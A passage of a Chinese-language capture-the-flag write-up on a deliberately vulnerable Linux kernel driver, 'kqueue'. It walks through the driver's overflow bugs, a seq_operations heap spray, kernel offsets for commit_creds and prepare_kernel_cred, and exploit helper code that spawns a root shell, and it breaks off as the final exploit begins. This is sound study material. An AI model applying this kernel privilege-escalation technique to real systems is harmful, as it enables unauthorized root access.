class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    kfree(<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">queue</span>,<span class="number">0</span>,<span class="built_in">queue</span>-&gt;queue_size);</span><br><span class="line">    kqueues[request.queue_idx] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是edit_kqueue函数，即在第queue_idx个队列中的第entry_idx个元素中写入内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">edit_kqueue</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if the kqueue exists at that idx */</span></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = kqueues[request.queue_idx];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">queue</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check the idx of the kqueue entry */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the kqueue entry memory */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for the existence of the kqueue entry */</span></span><br><span class="line">    exists = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;<span class="built_in">queue</span>-&gt;max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* If kqueue entry found , do the necessary */</span></span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">            <span class="keyword">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class="line">                validate(<span class="built_in">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">                exists = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(request.entry_idx==<span class="number">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class="built_in">queue</span>-&gt;data_size)&#123;</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(<span class="built_in">queue</span>-&gt;data,request.data,<span class="built_in">queue</span>-&gt;data_size));</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!exists)</span><br><span class="line">        <span class="keyword">return</span> NOT_EXISTS;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这是save函数，其功能是将一个队列中的所有字符串在另外一个内存块中保存。注意这里每一个字符串拷贝的大小为request.data_size，前面对request.data_size的比较仅仅是比较其是否大于整个queue的大小。因此这里存在溢出漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class="line"><span class="type">static</span> noinline <span class="type">long</span> <span class="title function_">save_kqueue_entries</span><span class="params">(<span class="type">request_t</span> request)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for out of bounds queue_idx requests */</span></span><br><span class="line">    <span class="keyword">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if queue is already saved or not */</span></span><br><span class="line">    <span class="keyword">if</span>(isSaved[request.queue_idx]==<span class="literal">true</span>)</span><br><span class="line">        err(<span class="string">&quot;[-] Queue already saved&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">queue</span> *<span class="built_in">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class="line">    <span class="keyword">if</span>(request.max_entries &lt; <span class="number">1</span> || request.max_entries &gt; <span class="built_in">queue</span>-&gt;max_entries)</span><br><span class="line">        err(<span class="string">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate memory for the kqueue to be saved */</span></span><br><span class="line">    <span class="type">char</span> *new_queue = validate((<span class="type">char</span> *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each saved entry can have its own size */</span></span><br><span class="line">    <span class="keyword">if</span>(request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size)</span><br><span class="line">        err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">        validate(<span class="built_in">memcpy</span>(new_queue,<span class="built_in">queue</span>-&gt;data,request.data_size));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">    new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Get to the entries of the kqueue */</span></span><br><span class="line">    queue_entry *kqueue_entry = (queue_entry *)(<span class="built_in">queue</span> + (<span class="keyword">sizeof</span>(<span class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="type">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，我们大概理解了这个驱动的功能，其中包含了一个整型溢出漏洞和一个缓冲区溢出漏洞。接下来介绍这个漏洞应该如何利用。</p><p>本题的漏洞利用方式需要借助一个结构体：<code>seq_operations</code>，大小为0x20（与queue相同），包含4个指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line"><span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line"><span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line"><span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line"><span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单介绍一下这个结构体是干什么用的。这是序列文件必备的结构体，相当于一个迭代器，能够循环输出某些内容，常用于导出数据与记录，便于管理大数据文件。当一个定义了这个结构体的LKM被打开（如使用cat命令）时，内核就会创建这样的一个数据结构，并首先调用start函数指针。由于这个结构体的大小为0x20，因此其很有可能与上面的queue分配到相距不远的地方。如果能够控制这里的start指针，就能够控制内核执行流。本题打开的序列文件为&#x2F;proc&#x2F;self&#x2F;stat。</p><p>下面是这题的qemu启动脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel <span class="string">&quot;bzImage&quot;</span> \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 panic=-1 pti=off kaslr quiet&quot;</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd <span class="string">&quot;./rootfs.cpio&quot;</span> \</span><br><span class="line">    -net user \</span><br><span class="line">    -net nic</span><br></pre></td></tr></table></figure><p>可见其开启了kaslr保护，但没有SMAP&#x2F;SMEP和kpti，因此如果能够获取到内核地址的基址，就能够找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>两个函数的地址。至于如何找到内核基址，后面介绍。</p><p>现在，我们可以着手编写程序的交互部分了，一些通用的函数如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_HEAP_OVERFLOW_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CREATE_KQUEUE 0xDEADC0DE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_KQUEUE   0xDAADEEEE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_KQUEUE 0xBADDCAFE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SAVE          0xB105BABE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> max_entries;</span><br><span class="line">    <span class="type">uint16_t</span> data_size;</span><br><span class="line">    <span class="type">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="type">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="type">char</span>* data;</span><br><span class="line">&#125;<span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>*, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>*)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">error_log</span><span class="params">(<span class="type">char</span>* error_info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Fatal Error: %s\033[0m\n&quot;</span>, error_info);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">info_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m\033[1m[*] Info: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">success_log</span><span class="params">(<span class="type">char</span>* info)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Success: %s\033[0m\n&quot;</span>, info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    info_log(<span class="string">&quot;Status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getShell</span><span class="params">()</span>&#123;</span><br><span class="line">    info_log(<span class="string">&quot;Ready to get root......&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        error_log(<span class="string">&quot;Failed to get root!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    success_log(<span class="string">&quot;Root got!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_HEAP_OVERFLOW_H</span></span></span><br></pre></td></tr></table></figure><p>另外注意，本题中的所有检查实际上都是虚张声势，因为err函数并没有让程序强制退出，仅仅只是输出了一行错误信息就允许继续运行下去了。因此利用的思路可以尽情放开。</p><p>刚刚打开qemu时，笔者想用调试的方法查看LKM的运行过程。实际上，如果能够读取到<code>/sys/module/kqueue/.text</code>、<code>/sys/module/kqueue/.data</code>、<code>/sys/module/kqueue/.bss</code>的值或使用<code>lsmod</code>命令，就能够获取到LKM相应段的基址，但本题中权限不允许。这就比较麻烦了，需要首先将断点下在用户态程序中，然后一步一步跟踪到内核找到相应函数的调用位置。笔者尝试过通过搜索字符串等方式获取基址，但都失败了。这也是笔者认为这道题最为恶心的一个部分了。<del>（毕竟耗了一个晚上）</del></p><p>不过本题还好，不是太需要用到调试，下面的调试仅为演示。</p><p>测试代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-13.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;heap_overflow.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> seq_fd[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/kqueue&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        error_log(<span class="string">&quot;Cannot open /dev/kqueue!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">request_t</span> create_req = &#123;</span><br><span class="line">            .max_entries = <span class="number">0xFFFFFFFF</span>,</span><br><span class="line">            .data_size = <span class="number">0x20</span> * <span class="number">8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200</span>; i++)</span><br><span class="line">        seq_fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    ioctl(fd, CREATE_KQUEUE, &amp;create_req);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是进入ioctl函数中内核的执行情况，在kmalloc分配到内存后，查看周围的内存环境，发现有大量的重复内容，推测这就是前面0x200次打开stat文件申请到的seq_operations结构体。</p><p><img src="https://img-blog.csdnimg.cn/3c85c15a2b374d01a4b24e4cd1fdb2da.png"><br>我们可以在IDA中打开vmlinux，找到执行start函数指针的位置（函数名为seq_read）：<br><img src="https://img-blog.csdnimg.cn/8196e34339e84c70bc80459ca4c0a33d.png"><br>其与内核基址地址的差为0x201179。再找到<code>commit_creds</code>和<code>prepare_kernel_cred</code>的基址：<br>prepare_kernel_cred：偏移0x8C580。<br><img src="https://img-blog.csdnimg.cn/2d98da570bc74161ba090bfc01054182.png"><br>commit_creds：偏移0x8C140<br><img src="https://img-blog.csdnimg.cn/397f050e23dc49e4a4ec2287a2ed1400.png" alt="在这里插入图片描述"><br>在调用start前，内核将下一条指令的地址压入栈中，我们利用的就是这个地址，来获取内核的加载基址，进而执行<code>commit_cred(prepare_kernel_cred(NULL))</code>函数。自然地，我们可以写一个shellcode来完成这件事情。由于本题没有开启SMEP，因此我们可以直接用用户态的shellcode地址覆盖seq_operations中的地址，内核可以执行用户态的shellcode。</p><p>注意在save函数中，其申请的空间大小是queue-&gt;queue_size，我们之前传入的max_entries为0xFFFFFFFF，这使得queue-&gt;queue_size&#x3D;0x20，即新申请的空间与seq_operations在相近的位置。然而其拷贝的实际长度为request.data_size，可以产生溢出。当request.max_entries&#x3D;0时，拷贝的循环不会执行，而是只会执行循环前面的memcpy，将queue-&gt;data拷贝到新空间中，因此，如果我们在queue-&gt;data中写入shellcode的地址，就有覆盖一个seq_operations结构体的可能性。经过测试证明，当queue-&gt;data传入0x40的时候，溢出0x20个字节正好能够覆盖一个seq_operations结构体。</p><p>最终的exp：（头文件在上面，不变）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 